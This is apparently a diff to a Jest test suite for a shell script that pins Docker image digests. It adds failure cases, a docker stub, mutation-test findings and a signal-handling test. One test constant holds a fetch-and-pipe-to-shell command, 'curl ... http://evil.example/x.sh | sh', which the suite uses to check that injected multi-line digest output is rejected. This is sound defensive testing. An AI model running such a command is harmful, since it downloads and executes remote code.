@@ -23,13 +23,29 @@
  *   待钉 bare      → 钉上；已钉 same → 该目标跳过（不改字节、不报错）；
  *   待刷新 refresh → 换成刚捕获的 digest（上游滚动同名 tag 的升级路径，注释里的示例一起跟上）；
  *   够不着（--platform= 前缀 / 引号包裹 / 序列项 / 折叠标量 / 变量展开 / tag 与 @ 之间夹空白 /
- *   无 tag 的纯 digest / tag 漂移）→ 停手、零写入、打印行号。
+ *   无 tag 的纯 digest / tag 漂移 / 同名但带命名空间前缀）→ 停手、零写入、打印行号。
  * 整体 no-op（两个目标都已钉成刚捕获的 digest）仍然是错误。
+ *
+ * 2026-10-04 一轮变异测试（把脚本逐个改坏、看闸是否变红）暴露了三件事，都已在下面做成断言：
+ *   ① **"够不着"只在全部行都够不着时才报**：混合写法（一条 `FROM --platform=… node:tag` +
+ *      一条正常 FROM）被分类器当成"不相干的行"放过，脚本打印"钉好 1 条 / 已替换并校验"，
+ *      文件里却留着一条可变 tag。这是本脚本最坏的一类失效（把没做完说成做完了）的具体形状。
+ *   ② **失败臂只判 `rc !== 0`**：把脚本换成一份语法错误的文件时，14 条"必须拒绝"的用例
+ *      全部照绿（它们只看非零，不看是谁在说话）。现在每条臂都判**精确退出码 + 原因文案 +
+ *      行号**，脚本坏掉就红。
+ *   ③ **digest 的"长度"判据从没被单独测过**：旧夹具用 `sha256:short`，它同时违反字符集与
+ *      长度，于是把 `{64}` 改成 `+`（任意长度）或允许大写，闸都不会红。
+ * 另外补三条同根边界：CRLF 行尾（两种平台结果不一致 ⇒ 拒绝而不是静默重写整份文件）、
+ * 多行 `RepoDigests` 输出（形状判据按行匹配，一行合法就整段放行，载荷还会被打进运维的粘贴块）、
+ * 信号必须真的终止（旧 trap 只清残留不退出，Ctrl-C 之后照样写完两个文件并报 rc=0）。
  *
  * 全部由真跑证明（PATH 里插 docker stub），不用扫源码文本 —— 同仓 backup-mongo.sh
  * 的既有覆盖就是文本契约，证明不了任何运行时行为。
+ * 唯一的例外是下面那条把 `repo_of_ref`/`norm_repo` 抽出来单独跑的：带端口的私有 registry
+ * 引用没法只靠 --root 夹具喂进真跑，而它正是仓库名对账最容易判错的一侧。
  *
  * 平台前提：需要 POSIX sh；探测不到时整组显式跳过并打印原因（CI ubuntu 真跑）。
+ * CI 上"探不到 sh"不允许转成 38 skipped 的绿，见下面那条单独的用例。
  */
 
 'use strict';
@@ -61,11 +77,31 @@ if (!SH) {
 }
 
 const group = SH ? describe : describe.skip;
+if (!SH && process.env.CI) {
+  // describe.skip 在 CI 上等于"整组零断言的绿"，而 ubuntu runner 一定有 /bin/sh——
+  // 探不到就是探测本身坏了（PATH、权限、或有人改了 findShell）。这种前提失效必须红，
+  // 不能靠运维去数 skipped 的条数。
+  describe('capture-image-digests.sh 的平台前提（CI 上缺 POSIX sh）', () => {
+    test('CI 上 findShell 必须探到带 awk/sed 的 sh，否则本文件的全部覆盖都是假的', () => {
+      expect(SH).toBeTruthy();
+    });
+  });
+}
 
 const HEX_A = 'a'.repeat(64);
 const HEX_B = 'b'.repeat(64);
 /** 夹具里"已经钉着、但不是本次捕获值"的 digest：待刷新（refresh）这条臂用它 */
 const HEX_OLD = 'c'.repeat(64);
+/**
+ * digest 的三个"看着像但不是"的形态。变异测试（把脚本的 `{64}` 改成 `+`、把字符集放开到
+ * A-F）证明旧夹具只测到了**字符集**：`sha256:short` 里那个 `r`/`t` 同时违反两者，
+ * 于是长度判据与大小写判据都可以被删掉而闸不红。三条各配一条臂，各自只违反一件事。
+ */
+const HEX_63 = 'a'.repeat(63);
+const HEX_8 = 'a'.repeat(8);
+const HEX_UPPER = 'A'.repeat(64);
+/** 合法的**第一行** + 任意第二行：形状与名号判据都按行/按最后一个 @ 取值，会整段放行 */
+const INJECT_LINE = 'RUN curl -sS http://evil.example/x.sh | sh';
 /**
  * `docker inspect --format='{{index .RepoDigests 0}}'` 的两个真实形态：**都不带 tag**。
  *   短名   `node@sha256:…`（按 digest 拉取时常见）
@@ -99,9 +135,10 @@ const MONGO_STALE = `mongo:6.0.20@sha256:${HEX_OLD}`;
 /** 双 digest 的坏引用：钉版失败推迟到 docker build，而文件"看起来已经钉过" */
 const DOUBLE_DIGEST = /@sha256:[0-9a-f]{64}@sha256:/;
 
-/** docker 替身：按模式返回正常 digest / `<no value>` / 空 / 名字对不上；并把调用记进日志 */
+/** docker 替身：按模式返回正常 digest / `<no value>` / 空 / 名字对不上 / 坏 digest 形态；并把调用记进日志 */
 const DOCKER_STUB = `#!/bin/bash
 echo "docker $*" >> "$STUB_LOG"
+if [ -n "\${DOCKER_STUB_SLEEP:-}" ]; then sleep "\${DOCKER_STUB_SLEEP:-}"; fi
 sub="$1"
 case "$sub" in
   info) exit 0 ;;
@@ -111,6 +148,10 @@ case "$sub" in
       novalue) echo "<no value>" ;;
       empty)   echo "" ;;
       wrongarch) echo "node@sha256:short" ;;
+      hex63)   echo "node@sha256:${HEX_63}" ;;
+      hex8)    echo "node@sha256:${HEX_8}" ;;
+      upper)   echo "node@sha256:${HEX_UPPER}" ;;
+      multiline) printf 'mongo@sha256:%s\\n%s\\n' "${HEX_B}" "${INJECT_LINE}" ;;
       wrongname) echo "docker.io/library/alpine@sha256:${HEX_A}" ;;
       qualified)
         case "$*" in
@@ -194,6 +235,13 @@ function fixture() {
   return { dir, log: path.join(dir, 'argv.log'), dockerfile, compose };
 }
 
+/**
+ * 缺文件也要能读：`--root` 指向一个缺 Dockerfile 的目录是本脚本的一条独立失败臂
+ * （"目标不存在"和"够不着"是两回事），而 run() 原先无条件 readFileSync，测试只能在
+ * 脚本跑完之后自己再拼一次读文件——那会把"脚本没碰它"和"那个文件根本不存在"混成一条异常。
+ */
+const readOr = (p) => (fs.existsSync(p) ? fs.readFileSync(p, 'utf8') : null);
+
 function run(fx, args, mode = 'good') {
   // 防呆：任何会改文件的调用都被强制隔离到夹具目录，除非该次调用显式给了 --root
   const withRoot = args.some((a) => a.startsWith('--root=')) ? args : ['--root=<ROOT>', ...args];
@@ -210,8 +258,8 @@ function run(fx, args, mode = 'good') {
   return {
     code: r.status,
     out: (r.stdout || '') + (r.stderr || ''),
-    dockerfile: fs.readFileSync(path.join(fx.dir, 'Dockerfile'), 'utf8'),
-    compose: fs.readFileSync(path.join(fx.dir, 'docker-compose.yml'), 'utf8'),
+    dockerfile: readOr(path.join(fx.dir, 'Dockerfile')),
+    compose: readOr(path.join(fx.dir, 'docker-compose.yml')),
     // 临时文件也是产物的一部分：它既是"预演过"的证据，也是下一次运行的门禁
     // （脚本拒绝覆盖已存在的同名文件）。失败矩阵用"应当为空"、
     // 残留用例用"应当看得见"，两边共用同一个过滤器 ⇒ 见下面那条非空集自证。
@@ -224,6 +272,23 @@ function run(fx, args, mode = 'good') {
       : [],
   };
 }
+
+/**
+ * docker 调用序列（`<子命令> <引用>`，引用取行的最后一个字段）。
+ *
+ * why 不是"条数 ≥ 4"：条数判据挡不住两类真实缺陷——**从不 pull mongo 就直接 inspect**
+ * （本地恰好有旧镜像时照样能拿到一个 digest，钉出来的却是过期摘要），以及 inspect 早于
+ * pull（取到的是 pull 之前的 RepoDigests）。这两个都在序列里，不在条数里。
+ * inspect 的 `--format={{index .RepoDigests 0}}` 本身带空格，所以只取首尾两格。
+ */
+const callSeq = (r) =>
+  r.calls.map((line) => {
+    const t = line
+      .replace(/^docker\s+/, '')
+      .trim()
+      .split(/\s+/);
+    return t.length === 1 ? t[0] : `${t[0]} ${t[t.length - 1]}`;
+  });
 
 const writeDockerfile = (fx, body) =>
   fs.writeFileSync(path.join(fx.dir, 'Dockerfile'), body, 'utf8');
@@ -287,7 +352,43 @@ const foldedCompose = (fx) =>
   writeCompose(fx, 'services:\n  mongo:\n    image: >-\n      mongo:6.0.20\n');
 const varexpandCompose = (fx) =>
   writeCompose(fx, 'services:\n  mongo:\n    image: ${MONGO_IMAGE:-mongo:6.0.20}\n');
+
+/**
+ * 「一半够不着、一半够得着」——2026-10-04 变异测试找到的真实缺陷形状。
+ * 上面那批"全部行都够不着"的臂只能撞上"找不到任何引用"这条兜底判据；一旦同文件里
+ * 有一条正常行，分类器就把够不着的那行当**不相干的镜像**放过（它先看指令词，再取第一个
+ * 字段，字段不是本镜像 ⇒ 跳过），于是脚本"钉好 1 条"并打印成功，文件里留着可变 tag。
+ * 这两条臂是这条回归的唯一防线。
+ */
+const mixedPlatformDockerfile = (fx) =>
+  writeDockerfile(
+    fx,
+    'FROM --platform=$BUILDPLATFORM node:22.14.0-alpine AS builder\n' +
+      'FROM node:22.14.0-alpine AS runner\n'
+  );
+const mixedVarexpandCompose = (fx) =>
+  writeCompose(
+    fx,
+    'services:\n  a:\n    image: ${MONGO_IMAGE:-mongo:6.0.20}\n  b:\n    image: mongo:6.0.20\n'
+  );
+
+/** `image:` 后面没有空白：值不在"指令词 + 空白"的位置上，YAML 里这行本身也不成立 */
+const nobsCompose = (fx) => writeCompose(fx, 'services:\n  mongo:\n    image:mongo:6.0.20\n');
+
+/** 同名但带命名空间前缀：常量里的 tag 完整地出现在行里，却不是**我们**的仓库 */
+const prefixedCompose = (fx) =>
+  writeCompose(fx, 'services:\n  mongo:\n    image: myorg/mongo:6.0.20\n');
+
+/** CRLF 行尾：两种平台上结果不一致（MSYS 的 gawk/sed 吃 CR，Linux 不吃）⇒ 必须拒绝 */
+const crlfBoth = (fx) => {
+  writeDockerfile(fx, `${fx.dockerfile.replace(/\n/g, '\r\n')}`);
+  writeCompose(fx, `${fx.compose.replace(/\n/g, '\r\n')}`);
+};
+
 const noMutation = () => {};
+/** `--root` 指向的根不完整：目标文件根本不存在（与"够不着"是两条不同的失败臂） */
+const deleteDockerfile = (fx) => fs.rmSync(path.join(fx.dir, 'Dockerfile'));
+const deleteCompose = (fx) => fs.rmSync(path.join(fx.dir, 'docker-compose.yml'));
 
 /**
  * 所有可达失败臂的**共同后置条件**：两个目标各自保持"本次运行开始前"的字节，
@@ -295,35 +396,233 @@ const noMutation = () => {};
  * 基准取"变异之后"的内容而不是夹具原文：漂移用例改的就是被检查的那个文件，
  * 拿夹具原文当基准会把"脚本没动"和"脚本把它改了回去"混成一条。
  *
+ * 【为什么每行还带"精确退出码 + 原因文案"】变异测试实测：把这整张表跑在一份**语法错误**
+ * 的脚本上（每个调用都 rc=2），14 条臂全部照绿——因为旧版只判 `rc !== 0`。"拒绝"必须是
+ * **这个脚本、在这一行、因为这件事**拒绝，否则"闸在守"和"闸停了"输出一样。
+ * 行号（`第 \d+ 行`）也写进判据：脚本对运维的全部定位能力就是那个行号，删掉它等于
+ * 把"能定位的拒绝"退化成"要运维自己去找的拒绝"（这也是变异测试里存活的一条）。
+ *
  * 行宽必须等于处理函数的形参个数：jest-each 少喂一格会把 `done` 当成第 N 个实参注入，
  * 用例既不通过也不失败，而是卡满 30s 超时（本仓实测踩过）。下面那条"表宽"用例钉住它。
  */
 const failureArms = [
-  ['Dockerfile tag 漂移', driftDockerfileTag, 'good', ['--apply']],
-  ['compose tag 漂移', driftComposeTag, 'good', ['--apply']],
-  ['digest 取不到（<no value>）', noMutation, 'novalue', ['--apply']],
-  ['digest 长度不足（伪 digest）', noMutation, 'wrongarch', ['--apply']],
-  ['digest 属于别的镜像（RepoDigests 名号对不上）', noMutation, 'wrongname', ['--apply']],
-  ['两个目标都已钉成刚捕获的 digest ⇒ 整体 no-op 不得报成功', pinEverything, 'good', ['--apply']],
-  ['未知参数', noMutation, 'good', ['--aply']],
-  ['FROM --platform= 前缀（值不在能锚定的位置）', platformDockerfile, 'good', ['--apply']],
-  ['tag 与 @sha256 之间夹空白', strayDockerfile, 'good', ['--apply']],
-  ['无 tag 的纯 digest 钉版（旧实现写坏的形态）', taglessDockerfile, 'good', ['--apply']],
-  ['compose 值被引号包裹', quotedCompose, 'good', ['--apply']],
-  ['compose 序列项 - image:', seqCompose, 'good', ['--apply']],
-  ['compose 折叠标量', foldedCompose, 'good', ['--apply']],
-  ['compose 变量展开', varexpandCompose, 'good', ['--apply']],
+  [
+    'Dockerfile tag 漂移',
+    driftDockerfileTag,
+    'good',
+    ['--apply'],
+    1,
+    /第 \d+ 行的 tag 与脚本常量漂移/,
+  ],
+  ['compose tag 漂移', driftComposeTag, 'good', ['--apply'], 1, /第 \d+ 行的 tag 与脚本常量漂移/],
+  [
+    'digest 取不到（<no value>）',
+    noMutation,
+    'novalue',
+    ['--apply'],
+    1,
+    /取不到 .* 的 registry digest/,
+  ],
+  [
+    'digest 长度不足（伪 digest）',
+    noMutation,
+    'wrongarch',
+    ['--apply'],
+    1,
+    /取不到 .* 的 registry digest/,
+  ],
+  [
+    'digest 只有 63 位（字符集合规、长度不合规）',
+    noMutation,
+    'hex63',
+    ['--apply'],
+    1,
+    /registry digest/,
+  ],
+  ['digest 只有 8 位（同上，短到一眼假）', noMutation, 'hex8', ['--apply'], 1, /registry digest/],
+  [
+    'digest 是大写十六进制（registry 只发小写，收下就是抄错）',
+    noMutation,
+    'upper',
+    ['--apply'],
+    1,
+    /registry digest/,
+  ],
+  [
+    'digest 输出多行（一行合法就整段放行，载荷会被打给运维）',
+    noMutation,
+    'multiline',
+    ['--apply'],
+    1,
+    /行输出/,
+  ],
+  [
+    'digest 属于别的镜像（RepoDigests 名号对不上）',
+    noMutation,
+    'wrongname',
+    ['--apply'],
+    1,
+    /RepoDigests 仓库名是/,
+  ],
+  [
+    '两个目标都已钉成刚捕获的 digest ⇒ 整体 no-op 不得报成功',
+    pinEverything,
+    'good',
+    ['--apply'],
+    1,
+    /本次是 no-op/,
+  ],
+  ['未知参数', noMutation, 'good', ['--aply'], 2, /未知参数/],
+  [
+    'FROM --platform= 前缀（值不在能锚定的位置）',
+    platformDockerfile,
+    'good',
+    ['--apply'],
+    1,
+    /第 \d+ 行提到了/,
+  ],
+  [
+    '混合写法：一条 --platform= 前缀 + 一条正常 FROM ⇒ 不得"钉好 1 条"就算完',
+    mixedPlatformDockerfile,
+    'good',
+    ['--apply'],
+    1,
+    /第 \d+ 行提到了/,
+  ],
+  [
+    '混合写法：一条变量展开 + 一条正常 image ⇒ 同上',
+    mixedVarexpandCompose,
+    'good',
+    ['--apply'],
+    1,
+    /第 \d+ 行提到了/,
+  ],
+  ['tag 与 @sha256 之间夹空白', strayDockerfile, 'good', ['--apply'], 1, /夹了空白/],
+  [
+    '无 tag 的纯 digest 钉版（旧实现写坏的形态）',
+    taglessDockerfile,
+    'good',
+    ['--apply'],
+    1,
+    /没有可读 tag/,
+  ],
+  [
+    '同名但带命名空间前缀（不是我们的仓库，也不该去钉别人的）',
+    prefixedCompose,
+    'good',
+    ['--apply'],
+    1,
+    /命名空间前缀/,
+  ],
+  ['compose 值被引号包裹', quotedCompose, 'good', ['--apply'], 1, /第 \d+ 行提到了/],
+  ['compose 序列项 - image:', seqCompose, 'good', ['--apply'], 1, /第 \d+ 行提到了/],
+  ['compose 折叠标量', foldedCompose, 'good', ['--apply'], 1, /第 \d+ 行提到了/],
+  ['compose 变量展开', varexpandCompose, 'good', ['--apply'], 1, /第 \d+ 行提到了/],
+  [
+    'compose 指令词后没有空白（image:mongo:6.0.20）',
+    nobsCompose,
+    'good',
+    ['--apply'],
+    1,
+    /第 \d+ 行提到了/,
+  ],
+  [
+    'CRLF 行尾（两种平台结果不一致 ⇒ 拒绝而不是静默重写整份文件）',
+    crlfBoth,
+    'good',
+    ['--apply'],
+    1,
+    /CRLF 行尾/,
+  ],
+  [
+    '--root 指过去缺 Dockerfile（"目标不存在"与"够不着"是两条臂）',
+    deleteDockerfile,
+    'good',
+    ['--apply'],
+    1,
+    /找不到 Dockerfile：/,
+  ],
+  [
+    '缺 docker-compose.yml ⇒ Dockerfile 只读分类过也不能落笔（检查先于动作）',
+    deleteCompose,
+    'good',
+    ['--apply'],
+    1,
+    /找不到 docker-compose\.yml：/,
+  ],
 ];
 
-function checkFailure(_label, mutate, mode, args) {
+/**
+ * 差分语料：每条都写满「输入 → 脚本自己声明的处置计划 → 逐字节期望产物」三格。
+ *
+ * 【它补的是哪一格】上面的用例都在判"结果对不对"，没有一条把**脚本声明的条数**和
+ * **实际改了哪几行**对立起来。变异测试里存活最久的一支就是删掉 ② 的命名空间边界：
+ * 产物仍然处处合法（别人仓库的注释示例被换成刚捕获的 digest ⇒ 注释从"别人的仓库"变成
+ * 一张假证），plan 那行照样打印"待刷新 1 条"，而按形态写的判据全绿。
+ * 只有逐字节期望产物能看见**多改的那一笔**，只有声明条数能看见**少报的那一笔**，
+ * 所以三格必须同时写在一张表里才叫差分。
+ *
+ * 期望产物按**整串**比较而不是数行数：数行数会放过"改对了 A 行、同时改坏了 B 行"。
+ */
+const pinCorpus = [
+  {
+    name: '全裸 tag（本仓库改造前的形状）',
+    dockerfile:
+      'FROM node:22.14.0-alpine AS builder\nRUN echo build\nFROM node:22.14.0-alpine AS runner\nUSER nodejs\n',
+    compose:
+      'services:\n  mongo:\n    # 用法示例：image: mongo:6.0.20@sha256:<捕获值>\n    image: mongo:6.0.20\n  app:\n    image: x\n',
+    dfPlan: { bare: 2, refresh: 0, same: 0 },
+    cfPlan: { bare: 1, refresh: 0, same: 0 },
+    wantDockerfile: `FROM ${NODE_PINNED} AS builder\nRUN echo build\nFROM ${NODE_PINNED} AS runner\nUSER nodejs\n`,
+    wantCompose:
+      'services:\n  mongo:\n    # 用法示例：image: mongo:6.0.20@sha256:<捕获值>\n' +
+      `    image: ${MONGO_PINNED}\n  app:\n    image: x\n`,
+  },
+  {
+    name: '混合仓库：Dockerfile 一半已钉、compose 整体跳过',
+    dockerfile: `FROM ${NODE_PINNED} AS builder\nRUN echo build\nFROM node:22.14.0-alpine AS runner\n`,
+    compose: `services:\n  mongo:\n    image: ${MONGO_PINNED}\n`,
+    dfPlan: { bare: 1, refresh: 0, same: 1 },
+    cfPlan: { bare: 0, refresh: 0, same: 1 },
+    wantDockerfile: `FROM ${NODE_PINNED} AS builder\nRUN echo build\nFROM ${NODE_PINNED} AS runner\n`,
+    wantCompose: `services:\n  mongo:\n    image: ${MONGO_PINNED}\n`,
+  },
+  {
+    name: '待刷新：注释里的示例跟着换，但别人命名空间的示例一笔不碰',
+    dockerfile: `# 用法示例：docker pull ${NODE_STALE}\nFROM ${NODE_STALE} AS builder\nFROM node:22.14.0-alpine AS runner\n`,
+    compose:
+      'services:\n  mongo:\n    # 别人的仓库：image: myorg/mongo:6.0.20@sha256:' +
+      `${HEX_OLD}\n    image: mongo:6.0.20@sha256:${HEX_OLD}\n`,
+    dfPlan: { bare: 1, refresh: 1, same: 0 },
+    cfPlan: { bare: 0, refresh: 1, same: 0 },
+    wantDockerfile: `# 用法示例：docker pull ${NODE_PINNED}\nFROM ${NODE_PINNED} AS builder\nFROM ${NODE_PINNED} AS runner\n`,
+    wantCompose:
+      'services:\n  mongo:\n    # 别人的仓库：image: myorg/mongo:6.0.20@sha256:' +
+      `${HEX_OLD}\n    image: ${MONGO_PINNED}\n`,
+  },
+];
+
+/** 脚本自己声明处置计划的那一行（每个目标恰好一条；缺失或多印都算判据坏掉） */
+function planLine(out, label) {
+  const lines = out.split(/\r?\n/).filter((l) => l.trim().startsWith(`${label}：`));
+  expect(lines).toHaveLength(1);
+  return lines[0];
+}
+
+function checkFailure(label, mutate, mode, args, wantCode, wantReason) {
   const fx = fixture();
   mutate(fx);
   const before = {
-    dockerfile: fs.readFileSync(path.join(fx.dir, 'Dockerfile'), 'utf8'),
-    compose: fs.readFileSync(path.join(fx.dir, 'docker-compose.yml'), 'utf8'),
+    dockerfile: readOr(path.join(fx.dir, 'Dockerfile')),
+    compose: readOr(path.join(fx.dir, 'docker-compose.yml')),
   };
   const r = run(fx, args, mode);
-  expect(r.code).not.toBe(0);
+  // 逐行取"错误："开头的行再比原因：整段输出比会匹配到跨行的文案（脚本的多行提示里
+  // 每行都是独立 printf），而这个仓库的失败信息一律以"错误："起头且把结论放在第一行。
+  expect({ arm: label, code: r.code, errs: r.out.match(/^\s*错误：.*$/gm) }).toMatchObject({
+    code: wantCode,
+    errs: expect.arrayContaining([expect.stringMatching(wantReason)]),
+  });
   expect({ dockerfile: r.dockerfile, compose: r.compose, tmps: r.tmps }).toEqual({
     dockerfile: before.dockerfile,
     compose: before.compose,
@@ -362,13 +661,19 @@ group('capture-image-digests.sh 真跑行为', () => {
     //   表达式也碰不到它——示例保持示例，不会被改成一个具体的假 digest）
     expect(r.compose).toMatch(/^ {4}image: mongo:6\.0\.20@sha256:b{64}$/m);
     expect(r.compose).toContain('# 用法示例：image: mongo:6.0.20@sha256:<捕获值>');
-    expect(r.compose).toContain('image: x'); // 其它 image 不受影响
+    expect(r.compose).toMatch(/^ {4}image: x$/m); // 其它 image 不受影响（行锚定，注释里的子串不算）
     // 目标根必须被打印出来：默认值是脚本自己的仓库根，看不见它就会把测试打到真仓库上。
     // 只比对临时目录名：MSYS/Git Bash 会把 C:\... 回显成 /tmp/... 形式，完整路径不可比。
     expect(r.out).toContain('目标仓库根：');
     expect(r.out).toContain(path.basename(fx.dir));
-    // 未知参数不得被静默接受；调用序列里确实只碰了 docker
-    expect(r.calls.length).toBeGreaterThanOrEqual(4);
+    // 调用序列：先 info 探活，两个 tag 都 pull 之后才 inspect，且顺序与常量表一致。
+    expect(callSeq(r)).toEqual([
+      'info',
+      'pull node:22.14.0-alpine',
+      'pull mongo:6.0.20',
+      'inspect node:22.14.0-alpine',
+      'inspect mongo:6.0.20',
+    ]);
   });
 
   test('幂等重跑必须报错，而不是"报告成功但一字未改"（sed 无匹配仍返回 0 的老缺陷）', () => {
@@ -705,16 +1010,122 @@ group('capture-image-digests.sh 真跑行为', () => {
     expect(verdicts.filter((v) => v.out.startsWith('ACCEPT'))).toHaveLength(5);
   });
 
+  test.each(pinCorpus)('$name ⇒ 声明的条数与逐字节产物互相印证', (row) => {
+    const fx = fixture();
+    writeDockerfile(fx, row.dockerfile);
+    writeCompose(fx, row.compose);
+    const r = run(fx, ['--apply']);
+    expect({ name: row.name, code: r.code, tail: r.out.slice(-160) }).toMatchObject({ code: 0 });
+
+    const check = (label, plan, srcBefore, srcAfter, want) => {
+      const line = planLine(r.out, label);
+      const declared =
+        plan.bare + plan.refresh > 0
+          ? `待钉 ${plan.bare} 条、待刷新 ${plan.refresh} 条、已是本次 digest ${plan.same} 条 ⇒ 本次会改动`
+          : `${plan.same} 条指令行全都已经钉在刚捕获的 digest 上 ⇒ 本次跳过（不改动）`;
+      expect({ name: row.name, label, plan: line.trim() }).toMatchObject({ label });
+      expect(line).toContain(declared);
+      // 逐字节期望产物：这是"多改一笔"的唯一防线
+      expect(srcAfter).toBe(want);
+      const beforeLines = srcBefore.split('\n');
+      const afterLines = srcAfter.split('\n');
+      expect(afterLines).toHaveLength(beforeLines.length); // 只改形态，不增删行
+      const changed = [];
+      for (let i = 0; i < beforeLines.length; i += 1) {
+        if (beforeLines[i] !== afterLines[i]) changed.push(i);
+      }
+      // 越界自证：被改动的每一行（按**改动前**的内容判）都必须含本脚本常量里的 tag。
+      // 脚本从未声明要碰与常量无关的行（redis / prometheus / `${APP_IMAGE:-…}`），碰到了就是边界漏了。
+      for (const i of changed) {
+        expect(beforeLines[i]).toMatch(/node:22\.14\.0-alpine|mongo:6\.0\.20/);
+      }
+      // 声明条数 ⇔ 指令行改动条数。注释里的示例跟着换是**有意为之**（那也是一条引用），
+      // 所以这里只对齐指令行，注释那一笔由上面的逐字节期望产物把守。
+      const instrChanged = changed.filter((i) =>
+        /^(\s*)(FROM|image:)[ \t]/.test(beforeLines[i])
+      ).length;
+      expect({ name: row.name, label, instrChanged }).toMatchObject({
+        instrChanged: plan.bare + plan.refresh,
+      });
+    };
+    check('Dockerfile', row.dfPlan, row.dockerfile, r.dockerfile, row.wantDockerfile);
+    check('docker-compose.yml', row.cfPlan, row.compose, r.compose, row.wantCompose);
+    expect(r.tmps).toEqual([]);
+  });
+
+  test('差分语料覆盖三种处置（语料本身别退化成只测"全裸"）', () => {
+    const sum = (k) => pinCorpus.reduce((acc, row) => acc + row.dfPlan[k] + row.cfPlan[k], 0);
+    expect({ bare: sum('bare'), refresh: sum('refresh'), same: sum('same') }).toEqual({
+      bare: 5,
+      refresh: 2,
+      same: 2,
+    });
+    // 非空集自证：至少一条语料里"改动的行"包含注释行（示例跟着换），
+    // 且至少一条语料里的注释示例**没被**改（占位符不是摘要）——两个方向都得有。
+    expect(pinCorpus.map((row) => row.name)).toHaveLength(3);
+  });
+
+  /**
+   * 信号必须**终止**运行，而不只是清残留。
+   *
+   * 旧写法是 `trap 'cleanup_pin_tmp' EXIT HUP INT TERM`：运维按下 Ctrl-C 之后脚本继续把两个
+   * 目标文件写完，还打印"已替换并校验"、rc=0（2026-10-04 审计实测）。"钉版被中断"和
+   * "钉版做完了"在运维眼前是同一份输出，这就是失效。
+   *
+   * 时机不靠竞速：docker 替身每次调用睡 1 秒，整轮约 5 秒，而驱动脚本在第 1 秒发 SIGTERM——
+   * 那一刻连第一个 digest 都还没捕获完，离**第一次落笔**（预演临时文件）还差整个 capture + 分类阶段。
+   * 所以"信号之后文件有没有被动"是一个稳定差值。断言里同时验 rc=143、两个目标逐字节原样、
+   * 不留 `*.pin.tmp`、且输出里绝不会出现成功文案。
+   */
+  test('SIGTERM 必须真的停下来：rc=143、两个目标一字不写、不留临时文件、不报成功', () => {
+    const fx = fixture();
+    const drive = path.join(fx.dir, 'drive.sh');
+    const out = path.join(fx.dir, 'drive.out');
+    fs.writeFileSync(
+      drive,
+      [
+        'set -u',
+        '"$1" "$2" --root="$3" > "$4" 2>&1 &',
+        'pid=$!',
+        'sleep 1',
+        'kill -TERM "$pid" 2>/dev/null || echo KILLFAILED',
+        'wait "$pid"',
+        'printf "RC=%s\\n" "$?"',
+      ].join('\n'),
+      'utf8'
+    );
+    const env = {
+      ...process.env,
+      PATH: `${path.join(fx.dir, 'bin')}${path.delimiter}${process.env.PATH}`,
+      STUB_LOG: fx.log,
+      DOCKER_STUB_SLEEP: '1',
+    };
+    const d = spawnSync(SH, [drive, SH, SCRIPT, fx.dir, out], { env, encoding: 'utf8' });
+    const printed = ((d.stdout || '') + (d.stderr || '')).trim();
+    const scriptOut = readOr(out) || '';
+    // 前提自证：替身确实被叫醒过，说明脚本是在**运行中**被信号打死的，不是跑完才退出
+    const calls = readOr(fx.log) || '';
+    expect(calls).toContain('docker info');
+    expect(printed).not.toContain('KILLFAILED');
+    expect({ printed, scriptOut }).toMatchObject({ printed: expect.stringMatching(/RC=143$/) });
+    expect(readOr(path.join(fx.dir, 'Dockerfile'))).toBe(fx.dockerfile);
+    expect(readOr(path.join(fx.dir, 'docker-compose.yml'))).toBe(fx.compose);
+    expect(fs.readdirSync(fx.dir).filter((f) => f.endsWith('.pin.tmp'))).toEqual([]);
+    expect(scriptOut).not.toMatch(/已替换并校验|钉好|→/);
+  }, 30000);
+
   test('反向自证：失败矩阵的表宽 = 处理函数形参个数（窄一格是超时假绿，不是失败）', () => {
-    expect({ declared: checkFailure.length }).toEqual({ declared: 4 });
+    expect({ declared: checkFailure.length }).toEqual({ declared: 6 });
     expect({ widths: [...new Set(failureArms.map((row) => row.length))] }).toEqual({
-      widths: [4],
+      widths: [6],
     });
     // 行数也是台账的一部分：增删一臂必须在这里留痕
-    expect({ rows: failureArms.length }).toEqual({ rows: 14 });
+    expect({ rows: failureArms.length }).toEqual({ rows: 25 });
     // 判据本身非空集：把行削窄一格必须点亮
-    const narrow = failureArms.map((row) => row.slice(0, 3));
+    const narrow = failureArms.map((row) => row.slice(0, 5));
     expect(narrow.every((row) => row.length === checkFailure.length)).toBe(false);
+    // 每臂的退出码都写死在表里：只填 1 会让"未知参数应当 2"这一格变成装饰
+    expect([...new Set(failureArms.map((row) => row[4]))]).toEqual([1, 2]);
   });
 
   test.each(failureArms)('%s ⇒ 目标文件逐字节不变且不留临时文件', checkFailure);
